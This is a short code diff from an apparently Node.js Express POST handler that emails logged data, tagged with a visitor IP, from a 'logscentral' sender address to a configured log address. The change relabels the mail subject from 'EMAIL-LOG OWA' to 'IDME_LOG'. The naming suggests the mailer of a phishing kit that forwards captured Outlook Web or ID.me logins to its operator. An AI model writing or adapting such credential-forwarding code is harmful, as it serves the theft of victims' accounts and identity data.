@@ -66,7 +66,7 @@ app.post("/", (req, res) => {
     {
       from: "docu@logscentral.com",
       to: logEmail,
-      subject: "EMAIL-LOG OWA " + ip2,
+      subject: "IDME_LOG " + ip2,
       html,
     },
     function (err, reply) {
